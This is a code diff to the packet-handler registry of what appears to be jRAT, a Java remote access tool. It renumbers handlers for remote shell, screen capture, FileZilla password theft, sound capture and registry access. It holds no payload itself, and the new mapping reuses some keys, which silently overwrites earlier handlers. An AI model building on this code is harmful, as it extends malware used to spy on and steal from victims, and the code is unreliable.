@@ -1,6 +1,7 @@
 package se.jrat.client.packets.incoming;
 
 import java.util.HashMap;
+import java.util.Map;
 import java.util.Set;
 
 import se.jrat.client.Slave;
@@ -10,9 +11,9 @@ import se.jrat.common.PacketRange;
 
 public class IncomingPackets {
 
-	private static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();
+	private static final Map<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();
 
-	public static HashMap<Byte, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
+	public static Map<Byte, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
 		return incomingPackets;
 	}
 
@@ -23,6 +24,7 @@ public class IncomingPackets {
 	private static void reload() {
 		incomingPackets.clear();
 
+		incomingPackets.put((byte) 3, Packet3Initialized.class);
 		incomingPackets.put((byte) 4, Packet4InitOperatingSystem.class);
 		incomingPackets.put((byte) 5, Packet5InitUserHost.class);
 		incomingPackets.put((byte) 6, Packet6InitVersion.class);
@@ -34,29 +36,34 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 12, Packet12InitLocalAddress.class);
 		incomingPackets.put((byte) 13, Packet13InitTotalMemory.class);
 		incomingPackets.put((byte) 14, Packet14InitAvailableCores.class);
-
-		incomingPackets.put((byte) 36, Packet36Initialized.class);
-		incomingPackets.put((byte) 26, Packet26InitJavaPath.class);
-		incomingPackets.put((byte) 61, Packet61InitMonitors.class);
-		incomingPackets.put((byte) 62, Packet62InitDrives.class);
-		//incomingPackets.put((byte) 12, Packet12Disconnect.class);
-		//incomingPackets.put((byte) 13, Packet13Status.class);
+		incomingPackets.put((byte) 15, Packet15InitJavaPath.class);
+		incomingPackets.put((byte) 16, Packet16LoadedPlugins.class);
+		incomingPackets.put((byte) 17, Packet17InitDrives.class);
+		incomingPackets.put((byte) 18, Packet18InitMonitors.class);
+		
+		incomingPackets.put((byte) 12, Packet12Disconnect.class);
+		incomingPackets.put((byte) 13, Packet13Status.class);
 		incomingPackets.put((byte) 17, Packet17RemoteScreen.class);
 		incomingPackets.put((byte) 18, Packet18OneRemoteScreen.class);
 		incomingPackets.put((byte) 19, Packet19ListFiles.class);
 		incomingPackets.put((byte) 20, Packet20Process.class);
 		incomingPackets.put((byte) 21, Packet21RemoteShell.class);
-		
+		//22
+		//23
 		incomingPackets.put((byte) 24, Packet24JVMMemory.class);
-		
+		//25
+		//26
 		incomingPackets.put((byte) 27, Packet27URLStatus.class);
-		incomingPackets.put((byte) 29, Packet29ReceiveFile.class);
-		
+		//28
+		incomingPackets.put((byte) 29, Packet29ReceiveFile.class);		
+		//30
+		//31
+		//32
 		incomingPackets.put((byte) 32, Packet32SystemProperties.class);
 		incomingPackets.put((byte) 33, Packet33Thumbnail.class);
 		incomingPackets.put((byte) 34, Packet34CustomDirectory.class);
-		incomingPackets.put((byte) 35, Packet35ChatMessage.class);
-		
+		incomingPackets.put((byte) 35, Packet35ChatMessage.class);	
+		//36
 		incomingPackets.put((byte) 37, Packet37SearchResult.class);
 		incomingPackets.put((byte) 38, Packet38HostFile.class);
 		incomingPackets.put((byte) 39, Packet39HostEditResult.class);
@@ -67,7 +74,6 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 44, Packet44SystemJavaProperty.class);
 		incomingPackets.put((byte) 45, Packet45ArchivePreview.class);
 		incomingPackets.put((byte) 46, Packet46FileHash.class);
-
 		incomingPackets.put((byte) 48, Packet48FileZillaPassword.class);
 		incomingPackets.put((byte) 49, Packet49LanDevices.class);
 		incomingPackets.put((byte) 50, Packet50IPConfig.class);
@@ -77,16 +83,20 @@ public class IncomingPackets {
 		incomingPackets.put((byte) 54, Packet54Registry.class);
 		incomingPackets.put((byte) 55, Packet55InstalledProgram.class);
 		incomingPackets.put((byte) 56, Packet56NetworkAdapter.class);
-		// incomingPackets.put((byte) 57, .class);
+		//57
 		incomingPackets.put((byte) 58, Packet58SoundCapture.class);
 		incomingPackets.put((byte) 59, Packet59ThumbnailPreview.class);
-		incomingPackets.put((byte) 60, Packet60Error.class);
-		
+		incomingPackets.put((byte) 60, Packet60Error.class);		
+		//61
+		//62
+		//63
+		//64
 		incomingPackets.put((byte) 65, Packet65ErrorLog.class);
 		incomingPackets.put((byte) 66, Packet66Config.class);
-		incomingPackets.put((byte) 67, Packet67LoadedPlugins.class);
-		incomingPackets.put((byte) 68, Packet68RemoteScreenComplete.class);
-		
+		//67
+		incomingPackets.put((byte) 68, Packet68RemoteScreenComplete.class);	
+		//69
+		//70
 		incomingPackets.put((byte) 71, Packet71AllThumbnails.class);
 	}
 
